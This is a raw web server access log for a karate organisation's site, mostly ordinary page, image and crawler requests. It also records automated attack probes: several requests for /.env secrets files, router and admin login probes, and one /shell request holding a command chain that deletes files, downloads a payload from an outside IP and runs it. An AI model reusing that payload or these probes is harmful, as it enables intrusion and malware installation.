::ffff:83.97.73.89 - - [09/Jun/2023:00:16:07 +0000] "GET /console/ HTTP/1.1" 404 147 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:104.2.28.209 - - [09/Jun/2023:21:00:23 +0000] "GET /images/books/emptyHand.jpg HTTP/1.1" 200 12021 "https://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:104.2.28.209 - - [09/Jun/2023:21:00:23 +0000] "GET /images/books/movingzen.jpg HTTP/1.1" 200 3578 "https://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:104.2.28.209 - - [09/Jun/2023:21:00:23 +0000] "GET /images/books/karatedojo.jpg HTTP/1.1" 200 3457 "https://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:104.2.28.209 - - [09/Jun/2023:21:00:23 +0000] "GET /images/books/grappingmethod.jpg HTTP/1.1" 200 4025 "https://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:104.2.28.209 - - [09/Jun/2023:21:00:23 +0000] "GET /images/books/artofwar.jpg HTTP/1.1" 200 22573 "https://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:104.2.28.209 - - [09/Jun/2023:21:00:26 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "https://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:104.2.28.209 - - [09/Jun/2023:21:00:34 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "https://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:138.246.253.24 - - [09/Jun/2023:21:08:15 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
::ffff:104.2.28.209 - - [09/Jun/2023:21:10:55 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:104.2.28.209 - - [09/Jun/2023:21:15:53 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "https://www.wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
::ffff:45.79.171.66 - - [09/Jun/2023:21:20:29 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:187.134.92.36 - - [09/Jun/2023:21:25:51 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+95.214.27.201/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:135.125.246.110 - - [09/Jun/2023:21:28:13 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [09/Jun/2023:21:28:13 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:167.99.13.19 - - [09/Jun/2023:21:35:48 +0000] "GET /Temporary_Listen_Addresses HTTP/1.1" 404 165 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:43.155.118.219 - - [09/Jun/2023:22:06:29 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:18.210.28.14 - - [09/Jun/2023:22:09:01 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
::ffff:18.210.28.14 - - [09/Jun/2023:22:09:23 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
::ffff:18.210.28.14 - - [09/Jun/2023:22:13:22 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
::ffff:135.125.246.110 - - [09/Jun/2023:22:38:13 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.110 - - [09/Jun/2023:22:38:13 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:212.83.8.79 - - [09/Jun/2023:22:47:23 +0000] "GET / HTTP/1.0" 200 57394 "-" "-"
::ffff:51.89.5.185 - - [09/Jun/2023:22:51:00 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.89.5.185 - - [09/Jun/2023:22:51:01 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:103.118.30.122 - - [09/Jun/2023:22:55:58 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://34.212.47.6:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
::ffff:66.175.213.4 - - [09/Jun/2023:23:11:19 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
::ffff:104.63.190.164 - - [09/Jun/2023:23:24:29 +0000] "GET /images/JohnArce.jpg HTTP/1.1" 200 13951 "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:104.63.190.164 - - [09/Jun/2023:23:24:29 +0000] "GET /images/books/MBS2.jpg HTTP/1.1" 200 15317 "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:104.63.190.164 - - [09/Jun/2023:23:24:29 +0000] "GET /resources HTTP/1.1" 200 194907 "http://wadokikai.org/events" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:104.63.190.164 - - [09/Jun/2023:23:24:29 +0000] "GET /images/books/MBS.gif HTTP/1.1" 200 13195 "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:104.63.190.164 - - [09/Jun/2023:23:24:29 +0000] "GET /images/books/karatebook.jpg HTTP/1.1" 200 7644 "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:104.63.190.164 - - [09/Jun/2023:23:24:29 +0000] "GET /images/books/ZenMeditation.jpg HTTP/1.1" 200 3760 "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:104.63.190.164 - - [09/Jun/2023:23:24:29 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:104.63.190.164 - - [09/Jun/2023:23:24:29 +0000] "GET /images/books/shotokanSecrets.jpg HTTP/1.1" 200 4046 "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:104.63.190.164 - - [09/Jun/2023:23:24:29 +0000] "GET /images/books/dummies.jpg HTTP/1.1" 200 3631 "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:104.63.190.164 - - [09/Jun/2023:23:24:29 +0000] "GET /images/books/artofwar.jpg HTTP/1.1" 200 22573 "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:104.63.190.164 - - [09/Jun/2023:23:24:30 +0000] "GET /images/books/saibook.jpg HTTP/1.1" 200 3043 "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:104.63.190.164 - - [09/Jun/2023:23:24:30 +0000] "GET /images/books/karatedo.jpg HTTP/1.1" 200 3442 "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:104.63.190.164 - - [09/Jun/2023:23:24:30 +0000] "GET /images/books/movingzen.jpg HTTP/1.1" 200 3578 "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:104.63.190.164 - - [09/Jun/2023:23:24:30 +0000] "GET /images/tm.jpg HTTP/1.1" 200 25020 "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:43.155.118.219 - - [09/Jun/2023:23:24:31 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:104.63.190.164 - - [09/Jun/2023:23:24:54 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:104.63.190.164 - - [09/Jun/2023:23:25:06 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
::ffff:65.108.74.120 - - [09/Jun/2023:23:25:22 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.108.74.120 - - [09/Jun/2023:23:25:22 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.108.74.120 - - [09/Jun/2023:23:25:24 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.108.74.120 - - [09/Jun/2023:23:25:25 +0000] "GET / HTTP/1.1" 200 57394 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.108.74.120 - - [09/Jun/2023:23:25:26 +0000] "GET /events HTTP/1.1" 200 5867 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:140.246.164.95 - - [09/Jun/2023:23:25:27 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
::ffff:65.108.74.120 - - [09/Jun/2023:23:25:28 +0000] "GET /resources HTTP/1.1" 200 194907 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.108.74.120 - - [09/Jun/2023:23:25:28 +0000] "GET /schools HTTP/1.1" 200 97308 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.108.74.120 - - [09/Jun/2023:23:25:30 +0000] "GET /contact HTTP/1.1" 200 10017 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.108.74.120 - - [09/Jun/2023:23:25:31 +0000] "GET /contact?s=1&ss=0 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.108.74.120 - - [09/Jun/2023:23:25:33 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.108.74.120 - - [09/Jun/2023:23:25:34 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.108.74.120 - - [09/Jun/2023:23:25:35 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.108.74.120 - - [09/Jun/2023:23:25:36 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.108.74.120 - - [09/Jun/2023:23:25:36 +0000] "GET /contact?s=1&ss=5 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.108.74.120 - - [09/Jun/2023:23:25:37 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.108.74.120 - - [09/Jun/2023:23:25:38 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.108.74.120 - - [09/Jun/2023:23:25:39 +0000] "GET /contact?s=1&ss=8 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.108.74.120 - - [09/Jun/2023:23:25:40 +0000] "GET /contact?s=1&ss=9 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.108.74.120 - - [09/Jun/2023:23:25:40 +0000] "GET /contact?s=1&ss=10 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:65.108.74.120 - - [09/Jun/2023:23:25:41 +0000] "GET /contact?s=1&ss=11 HTTP/1.1" 200 9997 "http://www.wadokikai.org/" "Mozilla/5.0 (compatible; SeekportBot; +https://bot.seekport.com)"
::ffff:109.237.97.180 - - [09/Jun/2023:23:36:00 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.173 - - [09/Jun/2023:23:48:33 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:186.178.49.223 - - [09/Jun/2023:23:52:16 +0000] "GET / HTTP/1.1" 200 57394 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
